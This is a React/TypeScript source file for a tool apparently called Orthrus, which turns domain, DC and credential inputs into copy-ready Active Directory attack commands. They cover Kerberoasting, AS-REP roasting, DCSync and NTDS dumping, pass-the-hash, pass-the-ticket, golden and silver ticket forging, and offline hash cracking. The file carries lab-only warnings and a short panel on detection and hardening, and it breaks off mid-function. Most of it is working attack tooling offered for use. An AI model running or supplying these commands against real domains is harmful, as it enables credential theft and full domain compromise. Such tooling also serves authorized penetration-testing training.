// src/components/ad/ADAttackHelper.tsx
// Orthrus — practical AD attack command builder (authorized labs only)
import { useState, useCallback, useMemo, useEffect, useRef } from 'react'
import {
  BookOpen, AlertTriangle, Copy, Shield,
  CheckCircle, ListChecks, RotateCcw, Menu, Flame,
  Key, Server, User, Hash, Lightbulb, Database, Terminal
} from 'lucide-react'

type Tab =
  | 'overview'
  | 'details'
  | 'kerberoast'
  | 'asrep'
  | 'dcsync'
  | 'tickets'
  | 'collection'
  | 'checklist'

const STORAGE_CHECKLIST = 'orthrus_lab_checklist_v1'
const STORAGE_CREDS = 'orthrus_lab_creds_v1'

const tabs: ReadonlyArray<{ id: Tab; label: string; icon: React.ElementType }> = [
  { id: 'overview', label: 'Overview', icon: BookOpen },
  { id: 'details', label: 'How It Works', icon: Lightbulb },
  { id: 'kerberoast', label: 'Kerberoast', icon: Key },
  { id: 'asrep', label: 'AS-REP', icon: User },
  { id: 'dcsync', label: 'DCSync', icon: Database },
  { id: 'tickets', label: 'Tickets & Crack', icon: Hash },
  { id: 'collection', label: 'Collection', icon: Server },
  { id: 'checklist', label: 'Lab Checklist', icon: ListChecks },
]

const checklistItems = [
  { id: 'scope', label: 'Authorized domain / lab confirmed', detail: 'HTB/THM/GOAD/your lab AD only — written permission' },
  { id: 'cred', label: 'Valid domain user for authenticated paths', detail: 'Kerberoast usually needs a domain principal' },
  { id: 'dc', label: 'DC hostname / IP known', detail: 'From nmap, zone, or lab brief' },
  { id: 'kerb', label: 'Ran one Kerberoast path in lab', detail: 'Impacket or Rubeus — capture hashes' },
  { id: 'asrep', label: 'Ran one AS-REP roast path in lab', detail: 'Users without pre-auth' },
  { id: 'dcsync', label: 'Understood DCSync requirements', detail: 'Replication rights — not every user can do this' },
  { id: 'crack', label: 'Fed hashes to hashcat/john offline', detail: 'Mode 13100 / 18200 as appropriate' },
  { id: 'note', label: 'Documented findings + remediation', detail: 'SPN hygiene, pre-auth, tiering, ACL hardening' },
]

function CopyBtn({
  id, text, state, onCopy,
}: {
  id: string
  text: string
  state: 'idle' | 'copied' | 'failed'
  onCopy: (id: string, text: string) => void
}) {
  return (
    <button
      type="button"
      onClick={() => onCopy(id, text)}
      className={`text-xs transition-colors flex items-center gap-1 px-2 py-1 rounded hover:bg-white/5 flex-shrink-0 ${
        state === 'copied' ? 'text-emerald-400' : state === 'failed' ? 'text-red-400' : 'text-white/40 hover:text-white/70'
      }`}
    >
      {state === 'copied' ? <CheckCircle size={12} /> : state === 'failed' ? <AlertTriangle size={12} /> : <Copy size={12} />}
      {state === 'copied' ? 'Copied' : state === 'failed' ? 'Failed' : 'Copy'}
    </button>
  )
}

function Field({
  label, value, onChange, placeholder, mono, type = 'text',
}: {
  label: string
  value: string
  onChange: (v: string) => void
  placeholder?: string
  mono?: boolean
  type?: string
}) {
  return (
    <label className="block space-y-1.5">
      <span className="text-[10px] font-black uppercase tracking-widest text-white/40">{label}</span>
      <input
        type={type}
        value={value}
        onChange={e => onChange(e.target.value)}
        placeholder={placeholder}
        className={`w-full rounded-xl bg-black/30 border border-white/10 px-3 py-2 text-sm text-white/90 placeholder:text-white/25 outline-none focus:border-red-500/40 ${mono ? 'font-mono text-xs' : ''}`}
      />
    </label>
  )
}

function CmdBlock({
  id, title, cmd, note, copiedStates, onCopy,
}: {
  id: string
  title: string
  cmd: string
  note?: string
  copiedStates: Record<string, 'idle' | 'copied' | 'failed'>
  onCopy: (id: string, text: string) => void
}) {
  return (
    <div className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
      <div className="flex items-start justify-between gap-2 mb-2">
        <h4 className="text-white font-semibold text-sm">{title}</h4>
        <CopyBtn id={id} text={cmd} state={copiedStates[id] || 'idle'} onCopy={onCopy} />
      </div>
      <pre className="bg-black/50 p-3 rounded-lg font-mono text-xs text-red-300/90 overflow-x-auto whitespace-pre-wrap break-all">{cmd}</pre>
      {note && <p className="text-white/40 text-xs mt-2">{note}</p>}
    </div>
  )
}

function OverviewPanel() {
  return (
    <div className="space-y-6">
      <div>
        <h2 className="text-white font-semibold text-lg mb-2 text-red-400">Orthrus</h2>
        <p className="text-white/50 leading-relaxed text-sm">
          Builds the <strong className="text-white/70">exact commands</strong> for lab AD work once Cerberus / BloodHound
          (or ldap enum) has told you what is roastable or high-value. Fill domain, DC, and creds once — every tab reuses them.
        </p>
      </div>
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
        {[
          { t: 'Kerberoast', d: 'TGS for SPN accounts → hashcat 13100' },
          { t: 'AS-REP', d: 'No pre-auth users → hashcat 18200' },
          { t: 'DCSync', d: 'Replication rights → secretsdump' },
          { t: 'Tickets', d: 'Crack formats, kirbi ↔ ccache' },
          { t: 'Collection', d: 'SharpHound / bloodhound-python / LDAP' },
          { t: 'How It Works', d: 'Protocol-level detail for each technique' },
        ].map(x => (
          <div key={x.t} className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
            <h3 className="text-red-400 font-semibold text-sm mb-1">{x.t}</h3>
            <p className="text-xs text-white/50">{x.d}</p>
          </div>
        ))}
      </div>
      <div className="p-4 rounded-xl border border-red-500/20 flex gap-3" style={{ background: 'rgba(239,68,68,0.06)' }}>
        <AlertTriangle className="text-red-400 flex-shrink-0 mt-0.5" size={18} />
        <p className="text-sm text-white/50">
          Authorized labs only (GOAD, HTB/THM AD, your domain). Roasting, DCSync, and ticket ops without permission are illegal.
        </p>
      </div>
    </div>
  )
}

function DetailsPanel() {
  const blocks = [
    {
      title: 'Kerberoasting — what actually happens',
      body: [
        'Any authenticated domain user can request a service ticket (TGS) for an account that has a Service Principal Name (SPN).',
        'The TGS is encrypted with a key derived from the service account\'s password. Offline, you brute-force that password against the ticket.',
        'You do not need the service account\'s password to request the ticket — only a normal domain user (or sometimes more creative auth paths in advanced labs).',
        'High-value targets: SPNs on user accounts (not only computer accounts), especially with weak passwords and high privileges.',
      ],
      detect: 'Unusual TGS requests for many SPNs from one client; service accounts with human-user SPN patterns; honeypot SPNs.',
      fix: 'Strong long passwords or gMSA; minimize user-account SPNs; monitor 4769 patterns; tier admin accounts so a roast cannot reach DA.',
    },
    {
      title: 'AS-REP roasting — what actually happens',
      body: [
        'If a user has "Do not require Kerberos preauthentication" (DONT_REQ_PREAUTH), the AS-REP can be obtained without knowing their password.',
        'That response contains material encrypted with keys related to the user password — crackable offline (hashcat mode 18200).',
        'Often discoverable with only a username list; authenticated LDAP makes finding the UAC flag easier.',
      ],
      detect: 'Accounts with preauth disabled; AS-REQ/AS-REP anomalies without prior preauth.',
      fix: 'Require preauthentication everywhere unless a rare legacy exception is documented; alert on the UAC flag.',
    },
    {
      title: 'DCSync — what actually happens',
      body: [
        'Domain Controllers replicate directory secrets. Principals with DS-Replication-Get-Changes (and often Get-Changes-All) can ask for the same data.',
        'tools like secretsdump implement that replication request and can retrieve password hashes for lab accounts — including krbtgt in full-lab compromise scenarios.',
        'This is not "guessing admin"; it is abusing replication rights. BloodHound flags GetChanges / GetChangesAll edges for a reason.',
      ],
      detect: 'Replication requests from non-DC hosts; 4662 on sensitive objects; unusual DRSUAPI traffic.',
      fix: 'Strict control of replication rights; no accidental ACL grants on domain objects; monitor non-DC replication.',
    },
    {
      title: 'How Orthrus fits with Cerberus',
      body: [
        'Cerberus / BloodHound: map paths, find Kerberoastable / AS-REP / DCSync principals.',
        'Orthrus: turn those names into Impacket/Rubeus/hashcat command lines with your lab DC and creds filled in.',
        'Typical flow: collect → analyze path → roast or DCSync in lab → crack offline → document fix.',
      ],
      detect: '—',
      fix: '—',
    },
  ]
  return (
    <div className="space-y-5">
      <div>
        <h2 className="text-white font-semibold text-lg text-red-400 mb-1">How the techniques work</h2>
        <p className="text-sm text-white/50">
          Protocol-level detail so you know why a command exists — not only how to paste it. Lab learning focus.
        </p>
      </div>
      {blocks.map(b => (
        <div key={b.title} className="p-4 rounded-xl border border-white/10 space-y-3" style={{ background: 'rgba(255,255,255,0.03)' }}>
          <h3 className="text-red-400 font-semibold text-sm">{b.title}</h3>
          <ul className="space-y-2">
            {b.body.map((line, i) => (
              <li key={i} className="text-sm text-white/50 flex gap-2">
                <span className="text-red-400/80 font-mono text-xs mt-0.5">{String(i + 1).padStart(2, '0')}</span>
                <span>{line}</span>
              </li>
            ))}
          </ul>
          {b.detect !== '—' && (
            <div className="grid grid-cols-1 md:grid-cols-2 gap-2 pt-1">
              <div className="rounded-lg bg-black/30 border border-white/5 p-3">
                <div className="text-[10px] font-black uppercase tracking-widest text-white/30 mb-1">Detection angles</div>
                <p className="text-xs text-white/45">{b.detect}</p>
              </div>
              <div className="rounded-lg bg-black/30 border border-white/5 p-3">
                <div className="text-[10px] font-black uppercase tracking-widest text-white/30 mb-1">Hardening</div>
                <p className="text-xs text-white/45">{b.fix}</p>
              </div>
            </div>
          )}
        </div>
      ))}
    </div>
  )
}

function KerberoastPanel({
  domain, dc, user, password, spnUser, outfile, copiedStates, onCopy,
  setDomain, setDc, setUser, setPassword, setSpnUser, setOutfile,
}: {
  domain: string
  dc: string
  user: string
  password: string
  spnUser: string
  outfile: string
  copiedStates: Record<string, 'idle' | 'copied' | 'failed'>
  onCopy: (id: string, text: string) => void
  setDomain: (v: string) => void
  setDc: (v: string) => void
  setUser: (v: string) => void
  setPassword: (v: string) => void
  setSpnUser: (v: string) => void
  setOutfile: (v: string) => void
}) {
  const d = domain.trim() || 'LAB.LOCAL'
  const dcHost = dc.trim() || 'dc01.lab.local'
  const u = user.trim() || 'lowpriv'
  const p = password.trim() || 'Password123'
  const target = spnUser.trim()
  const out = outfile.trim() || 'kerb.hashes'

  const getUserSpnsAll = `GetUserSPNs.py -dc-ip ${dcHost} ${d}/${u}:'${p}' -request -outputfile ${out}`
  const getUserSpnsOne = target
    ? `GetUserSPNs.py -dc-ip ${dcHost} ${d}/${u}:'${p}' -request -request-user ${target} -outputfile ${out}`
    : `GetUserSPNs.py -dc-ip ${dcHost} ${d}/${u}:'${p}' -request -request-user SERVICE_ACCOUNT -outputfile ${out}`
  const getUserSpnsList = `GetUserSPNs.py -dc-ip ${dcHost} ${d}/${u}:'${p}'`
  const rubeusKerb = target
    ? `Rubeus.exe kerberoast /user:${target} /outfile:${out} /nowrap`
    : `Rubeus.exe kerberoast /stats\nRubeus.exe kerberoast /outfile:${out} /nowrap`
  const rubeusRc4 = `Rubeus.exe kerberoast /rc4opsec /outfile:${out} /nowrap`
  const rubeusAes = `Rubeus.exe kerberoast /aes /outfile:${out} /nowrap`
  const rubeusLdap = target
    ? `Rubeus.exe kerberoast /ldapfilter:"(samAccountName=${target})" /outfile:${out} /nowrap`
    : `Rubeus.exe kerberoast /ldapfilter:"(admincount=1)" /outfile:${out} /nowrap`
  const getUserSpnsHash = `GetUserSPNs.py -dc-ip ${dcHost} -hashes :NTHASH ${d}/${u} -request -outputfile ${out}`
  const getUserSpnsKerberos = `GetUserSPNs.py -dc-ip ${dcHost} -k -no-pass ${d}/${u} -request -outputfile ${out}`
  const netexecKerb = `netexec ldap ${dcHost} -u '${u}' -p '${p}' --kerberoasting ${out}`
  const crackmapexec = `crackmapexec ldap ${dcHost} -u '${u}' -p '${p}' --kerberoasting ${out}`
  const powerview = target
    ? `# PowerView (lab Windows session)\nGet-DomainUser -Identity ${target} | select samaccountname,serviceprincipalname\nRequest-SPNTicket -SPN "MSSQLSvc/sql.${d.toLowerCase()}"`
    : `# List kerberoastable (PowerView)\nGet-DomainUser -SPN | select samaccountname,serviceprincipalname,memberof`
  const crack = `hashcat -m 13100 ${out} /usr/share/wordlists/rockyou.txt -O`
  const johnKerb = `john --format=krb5tgs ${out} --wordlist=/usr/share/wordlists/rockyou.txt`
  const rubeusSimple = `Rubeus.exe kerberoast /user:${target || 'svc_mssql'} /simple /outfile:${out}`

  return (
    <div className="space-y-5">
      <div>
        <h2 className="text-white font-semibold text-lg text-red-400 mb-1">Kerberoast builder</h2>
        <p className="text-sm text-white/50">
          Request TGS for SPN-backed accounts, save hashes, crack offline. Needs a domain user for the usual path.
        </p>
      </div>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
        <Field label="Domain" value={domain} onChange={setDomain} placeholder="LAB.LOCAL" mono />
        <Field label="DC host / IP" value={dc} onChange={setDc} placeholder="dc01.lab.local" mono />
        <Field label="Auth user" value={user} onChange={setUser} placeholder="lowpriv" mono />
        <Field label="Auth password" value={password} onChange={setPassword} placeholder="Password123" mono type="password" />
        <Field label="Target SPN user (optional)" value={spnUser} onChange={setSpnUser} placeholder="svc_mssql" mono />
        <Field label="Output file" value={outfile} onChange={setOutfile} placeholder="kerb.hashes" mono />
      </div>
      <div className="space-y-3">
        <CmdBlock id="kerb-list" title="Impacket — list SPNs only (no request)" cmd={getUserSpnsList} note="Enumerate before roasting everything" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="kerb-impacket-all" title="Impacket — roast all requestable" cmd={getUserSpnsAll} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="kerb-impacket-one" title="Impacket — single account" cmd={getUserSpnsOne} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="kerb-rubeus" title="Rubeus — Kerberoast" cmd={rubeusKerb} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="kerb-rubeus-rc4" title="Rubeus — RC4 preference" cmd={rubeusRc4} note="Still noisy — match engagement rules" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="kerb-rubeus-aes" title="Rubeus — AES tickets" cmd={rubeusAes} note="Modern labs; crack mode depends on etype" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="kerb-powerview" title="PowerView — list / request (Windows)" cmd={powerview} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="kerb-rubeus-ldap" title="Rubeus — LDAP filter roast" cmd={rubeusLdap} note="Target adminCount or a specific samAccountName" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="kerb-rubeus-simple" title="Rubeus — /simple hash output" cmd={rubeusSimple} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="kerb-impacket-hash" title="Impacket — pass-the-hash auth" cmd={getUserSpnsHash} note="When you have NTLM for the auth user, not cleartext" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="kerb-impacket-k" title="Impacket — Kerberos ticket auth (-k)" cmd={getUserSpnsKerberos} note="Requires ccache / prior TGT in lab" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="kerb-nxc" title="NetExec — kerberoasting" cmd={netexecKerb} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="kerb-cme" title="CrackMapExec — kerberoasting" cmd={crackmapexec} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="kerb-crack" title="Hashcat — mode 13100 (RC4 TGS)" cmd={crack} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="kerb-john" title="John — krb5tgs" cmd={johnKerb} copiedStates={copiedStates} onCopy={onCopy} />
      </div>
    </div>
  )
}

function AsrepPanel({
  domain, dc, user, password, targetUser, wordlist, outfile, copiedStates, onCopy,
  setDomain, setDc, setUser, setPassword, setTargetUser, setWordlist, setOutfile,
}: {
  domain: string
  dc: string
  user: string
  password: string
  targetUser: string
  wordlist: string
  outfile: string
  copiedStates: Record<string, 'idle' | 'copied' | 'failed'>
  onCopy: (id: string, text: string) => void
  setDomain: (v: string) => void
  setDc: (v: string) => void
  setUser: (v: string) => void
  setPassword: (v: string) => void
  setTargetUser: (v: string) => void
  setWordlist: (v: string) => void
  setOutfile: (v: string) => void
}) {
  const d = domain.trim() || 'LAB.LOCAL'
  const dcHost = dc.trim() || 'dc01.lab.local'
  const u = user.trim()
  const p = password.trim()
  const t = targetUser.trim()
  const wl = wordlist.trim() || '/usr/share/wordlists/rockyou.txt'
  const out = outfile.trim() || 'asrep.hashes'

  const getNpUsersEnum = `GetNPUsers.py ${d}/ -dc-ip ${dcHost} -usersfile users.txt -format hashcat -outputfile ${out}`
  const getNpUsersAuth = u && p
    ? `GetNPUsers.py ${d}/${u}:'${p}' -dc-ip ${dcHost} -request -format hashcat -outputfile ${out}`
    : `GetNPUsers.py ${d}/USER:'PASS' -dc-ip ${dcHost} -request -format hashcat -outputfile ${out}`
  const getNpUsersOne = t
    ? `GetNPUsers.py ${d}/${t} -dc-ip ${dcHost} -no-pass -format hashcat -outputfile ${out}`
    : `GetNPUsers.py ${d}/TARGET_USER -dc-ip ${dcHost} -no-pass -format hashcat -outputfile ${out}`
  const rubeusAsrep = t
    ? `Rubeus.exe asreproast /user:${t} /format:hashcat /outfile:${out} /nowrap`
    : `Rubeus.exe asreproast /format:hashcat /outfile:${out} /nowrap`
  const usersFile = `# users.txt — one samAccountName per line\n${t || 'user1'}\nuser2\nsvc_orphan`
  const powerview = `# PowerView — find no-preauth users\nGet-DomainUser -PreauthNotRequired | select samaccountname`

  return (
    <div className="space-y-5">
      <div>
        <h2 className="text-white font-semibold text-lg text-red-400 mb-1">AS-REP roast builder</h2>
        <p className="text-sm text-white/50">
          Accounts with DONT_REQ_PREAUTH return crackable AS-REP material. Username list is often enough in lab.
        </p>
      </div>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
        <Field label="Domain" value={domain} onChange={setDomain} placeholder="LAB.LOCAL" mono />
        <Field label="DC host / IP" value={dc} onChange={setDc} placeholder="dc01.lab.local" mono />
        <Field label="Auth user (optional)" value={user} onChange={setUser} placeholder="lowpriv" mono />
        <Field label="Auth password (optional)" value={password} onChange={setPassword} placeholder="Password123" mono type="password" />
        <Field label="Target user (optional)" value={targetUser} onChange={setTargetUser} placeholder="no_preauth_user" mono />
        <Field label="Output file" value={outfile} onChange={setOutfile} placeholder="asrep.hashes" mono />
        <Field label="Wordlist path" value={wordlist} onChange={setWordlist} placeholder="/usr/share/wordlists/rockyou.txt" mono />
      </div>
      <div className="space-y-3">
        <CmdBlock id="asrep-usersfile" title="users.txt template" cmd={usersFile} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="asrep-enum" title="Impacket — usersfile → hashcat" cmd={getNpUsersEnum} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="asrep-one" title="Impacket — single user, no pass" cmd={getNpUsersOne} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="asrep-auth" title="Impacket — authenticated path" cmd={getNpUsersAuth} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="asrep-rubeus" title="Rubeus — AS-REP roast" cmd={rubeusAsrep} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="asrep-pv" title="PowerView — find targets" cmd={powerview} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="asrep-nxc" title="NetExec — asreproast" cmd={`netexec ldap ${dcHost} -u '${u || 'guest'}' -p '${p || ''}' --asreproast ${out}`} note="Adjust user/pass; some labs allow null/user-list flows via Impacket instead" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="asrep-hash" title="Impacket — PTH to request AS-REP data" cmd={u ? `GetNPUsers.py ${d}/${u} -dc-ip ${dcHost} -hashes :NTHASH -request -format hashcat -outputfile ${out}` : `GetNPUsers.py ${d}/USER -dc-ip ${dcHost} -hashes :NTHASH -request -format hashcat -outputfile ${out}`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="asrep-crack" title="Hashcat — mode 18200" cmd={`hashcat -m 18200 ${out} ${wl} -O`} note="Offline cracking box only" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="asrep-john" title="John — krb5asrep" cmd={`john --format=krb5asrep ${out} --wordlist=${wl}`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="asrep-show" title="Hashcat — show cracked" cmd={`hashcat -m 18200 ${out} --show`} copiedStates={copiedStates} onCopy={onCopy} />
      </div>
    </div>
  )
}

function DcsyncPanel({
  domain, dc, user, password, targetUser, copiedStates, onCopy,
  setDomain, setDc, setUser, setPassword, setTargetUser,
}: {
  domain: string
  dc: string
  user: string
  password: string
  targetUser: string
  copiedStates: Record<string, 'idle' | 'copied' | 'failed'>
  onCopy: (id: string, text: string) => void
  setDomain: (v: string) => void
  setDc: (v: string) => void
  setUser: (v: string) => void
  setPassword: (v: string) => void
  setTargetUser: (v: string) => void
}) {
  const d = domain.trim() || 'LAB.LOCAL'
  const dcHost = dc.trim() || 'dc01.lab.local'
  const u = user.trim() || 'lowpriv'
  const p = password.trim() || 'Password123'
  const t = targetUser.trim()

  const secretsAll = `secretsdump.py ${d}/${u}:'${p}'@${dcHost}`
  const secretsOne = t
    ? `secretsdump.py ${d}/${u}:'${p}'@${dcHost} -just-dc-user ${t}`
    : `secretsdump.py ${d}/${u}:'${p}'@${dcHost} -just-dc-user krbtgt`
  const secretsNtds = `secretsdump.py ${d}/${u}:'${p}'@${dcHost} -just-dc-ntlm`
  const mimikatz = t
    ? `lsadump::dcsync /domain:${d} /user:${t}`
    : `lsadump::dcsync /domain:${d} /user:krbtgt`
  const note = `# Requires DS-Replication-Get-Changes (+ often Get-Changes-All)\n# Confirm with BloodHound / ACLs before assuming DA`

  return (
    <div className="space-y-5">
      <div>
        <h2 className="text-white font-semibold text-lg text-red-400 mb-1">DCSync builder</h2>
        <p className="text-sm text-white/50">
          Replication-style hash retrieval when the principal has the rights. Not a default domain-user capability —
          check edges in Cerberus first.
        </p>
      </div>
      <div className="p-3 rounded-xl border border-amber-500/20 bg-amber-500/5 text-xs text-amber-100/70 flex gap-2">
        <AlertTriangle size={14} className="text-amber-400 flex-shrink-0 mt-0.5" />
        Lab domains only. Full NTDS dumps are extremely sensitive even in labs — prefer -just-dc-user when learning.
      </div>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
        <Field label="Domain" value={domain} onChange={setDomain} placeholder="LAB.LOCAL" mono />
        <Field label="DC host / IP" value={dc} onChange={setDc} placeholder="dc01.lab.local" mono />
        <Field label="Auth user (with rights)" value={user} onChange={setUser} placeholder="lab_admin" mono />
        <Field label="Auth password" value={password} onChange={setPassword} placeholder="Password123" mono type="password" />
        <Field label="Target user (optional)" value={targetUser} onChange={setTargetUser} placeholder="krbtgt or specific user" mono />
      </div>
      <div className="space-y-3">
        <CmdBlock id="dcsync-note" title="Rights reminder" cmd={note} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="dcsync-one" title="Impacket secretsdump — single user" cmd={secretsOne} note="Preferred while learning" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="dcsync-ntlm" title="Impacket — DC NTLM set" cmd={secretsNtds} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="dcsync-all" title="Impacket — broader dump" cmd={secretsAll} note="Heavy — lab only, know your scope" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="dcsync-mimikatz" title="Mimikatz-style DCSync (Windows lab)" cmd={mimikatz} note="Only on authorized lab hosts" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="dcsync-hash" title="Impacket secretsdump — PTH" cmd={`secretsdump.py ${d}/${u}@${dcHost} -hashes :NTHASH`} note="Replace NTHASH for the principal that has replication rights" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="dcsync-k" title="Impacket secretsdump — Kerberos (-k)" cmd={`secretsdump.py ${d}/${u}@${dcHost} -k -no-pass`} note="Uses current ccache in lab" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="dcsync-just-dc" title="Impacket — just-dc (SAM + NTDS focus)" cmd={`secretsdump.py ${d}/${u}:'${p}'@${dcHost} -just-dc`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="dcsync-nxc" title="NetExec — ntds (when rights allow)" cmd={`netexec smb ${dcHost} -u '${u}' -p '${p}' --ntds`} note="Only with sufficient rights; very sensitive even in lab" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="dcsync-procdump" title="Offline NTDS path (lab VM access)" cmd={`# If you already have ntds.dit + SYSTEM from a lab backup/volume\nsecretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`} note="For disk/volume labs — not remote DCSync" copiedStates={copiedStates} onCopy={onCopy} />
      </div>
    </div>
  )
}

function TicketsPanel({
  wordlist, outfileKerb, outfileAsrep, copiedStates, onCopy, setWordlist, setOutfileKerb, setOutfileAsrep,
}: {
  wordlist: string
  outfileKerb: string
  outfileAsrep: string
  copiedStates: Record<string, 'idle' | 'copied' | 'failed'>
  onCopy: (id: string, text: string) => void
  setWordlist: (v: string) => void
  setOutfileKerb: (v: string) => void
  setOutfileAsrep: (v: string) => void
}) {
  const wl = wordlist.trim() || '/usr/share/wordlists/rockyou.txt'
  const kerb = outfileKerb.trim() || 'kerb.hashes'
  const asrep = outfileAsrep.trim() || 'asrep.hashes'
  return (
    <div className="space-y-5">
      <div>
        <h2 className="text-white font-semibold text-lg text-red-400 mb-1">Tickets & offline crack</h2>
        <p className="text-sm text-white/50">Formats and conversions. Cracking stays offline — never on the DC.</p>
      </div>
      <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
        <Field label="Wordlist" value={wordlist} onChange={setWordlist} placeholder="/usr/share/wordlists/rockyou.txt" mono />
        <Field label="Kerberoast hash file" value={outfileKerb} onChange={setOutfileKerb} placeholder="kerb.hashes" mono />
        <Field label="AS-REP hash file" value={outfileAsrep} onChange={setOutfileAsrep} placeholder="asrep.hashes" mono />
      </div>
      <div className="space-y-3">
        <CmdBlock id="crack-kerb" title="Hashcat — Kerberoast RC4 (13100)" cmd={`hashcat -m 13100 ${kerb} ${wl} -O`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="crack-kerb-aes" title="Hashcat — AES TGS (verify mode)" cmd={`# Match etype to hashcat example hashes\nhashcat -m 19700 ${kerb} ${wl}\n# or 19600 depending on format`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="crack-asrep" title="Hashcat — AS-REP (18200)" cmd={`hashcat -m 18200 ${asrep} ${wl} -O`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="john-kerb" title="John — Kerberoast" cmd={`john --format=krb5tgs ${kerb} --wordlist=${wl}`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="john-asrep" title="John — AS-REP" cmd={`john --format=krb5asrep ${asrep} --wordlist=${wl}`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="rubeus-dump" title="Rubeus — triage / dump" cmd={`Rubeus.exe triage\nRubeus.exe dump /nowrap`} note="Scoped lab sessions only" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="ticket-convert" title="ticketConverter — kirbi ↔ ccache" cmd={`ticketConverter.py ticket.kirbi ticket.ccache\nticketConverter.py ticket.ccache ticket.kirbi`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="export-ccache" title="Use ccache with Impacket" cmd={`export KRB5CCNAME=./ticket.ccache\nsmbclient.py -k -no-pass LAB.LOCAL/Administrator@dc01.lab.local`} note="After converting a TGT/TGS for Linux tools" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="asktgt" title="Rubeus — askTGT (password)" cmd={`Rubeus.exe asktgt /user:lowpriv /password:Password123 /domain:LAB.LOCAL /outfile:lowpriv.kirbi /nowrap`} note="Replace with your lab values" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="asktgt-hash" title="Rubeus — askTGT (RC4 hash)" cmd={`Rubeus.exe asktgt /user:lowpriv /rc4:NTHASH /domain:LAB.LOCAL /outfile:lowpriv.kirbi /nowrap`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="asktgs" title="Rubeus — askTGS" cmd={`Rubeus.exe asktgs /ticket:lowpriv.kirbi /service:cifs/dc01.lab.local /outfile:cifs.kirbi /nowrap`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="ptt" title="Rubeus — pass-the-ticket" cmd={`Rubeus.exe ptt /ticket:cifs.kirbi`} note="Current Windows lab session only" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="getTGT" title="Impacket getTGT" cmd={`getTGT.py LAB.LOCAL/lowpriv:'Password123' -dc-ip dc01.lab.local\nexport KRB5CCNAME=lowpriv.ccache`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="getST" title="Impacket getST" cmd={`getST.py -spn cifs/dc01.lab.local LAB.LOCAL/lowpriv:'Password123' -dc-ip dc01.lab.local`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="golden-lab" title="Lab — golden ticket shape" cmd={`ticketer.py -nthash KRBTGT_NT_HASH -domain-sid S-1-5-21-... -domain LAB.LOCAL Administrator`} note="Only after krbtgt in an authorized lab — placeholder SID/hash" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="silver-lab" title="Lab — silver ticket shape" cmd={`ticketer.py -nthash SERVICE_NT_HASH -domain-sid S-1-5-21-... -domain LAB.LOCAL -spn cifs/dc01.lab.local Administrator`} note="Service hash + SPN — lab only" copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="hashcat-show-kerb" title="Hashcat — show cracked Kerberoast" cmd={`hashcat -m 13100 ${kerb} --show`} copiedStates={copiedStates} onCopy={onCopy} />
        <CmdBlock id="hashcat-show-asrep" title="Hashcat — show cracked AS-REP" cmd={`hashcat -m 18200 ${asrep} --show`} copiedStates={copiedStates} onCopy={onCopy} />

      </div>
    </div>
  )
}

function CollectionPanel({
  domain, dc, user, password, copiedStates, onCopy,
  setDomain, setDc, setUser, setPassword,
}: {
  domain: string
  dc: string
  user: string
  password: string
  copiedStates: Record<string, 'idle' | 'copied' | 'failed'>
  onCopy: (id: string, text: string) => void
